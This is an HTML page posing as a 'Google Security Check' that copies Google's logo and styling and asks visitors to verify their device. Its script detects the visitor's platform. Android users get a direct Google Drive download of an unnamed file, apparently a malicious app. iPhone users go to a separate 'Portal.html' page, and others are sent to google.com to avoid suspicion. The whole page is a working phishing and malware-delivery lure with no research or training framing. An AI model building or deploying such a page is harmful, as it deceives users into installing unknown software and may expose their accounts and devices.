<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Check</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; }
        .container { text-align: center; padding: 40px; width: 100%; max-width: 350px; }
        img { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px; }
        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png">
        <h1>Verify it's you</h1>
        <p>To continue to Google, we need to quickly verify your device security status.</p>
        <button class="btn" onclick="process()">Verify & Continue</button>
    </div>

    <script>
        function process() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            if (/android/i.test(userAgent)) {
                window.location.href = "https://drive.google.com/uc?export=download&confirm=t&id=19HIEP9vGAgLnLQNJFEznyYkMtbjdwGRc";
            } else if (/iPad|iPhone|iPod/.test(userAgent)) {
                window.location.href = "Portal.html";
            } else {
                window.location.href = "https://www.google.com";
            }
        }
    </script>
</body>
</html>
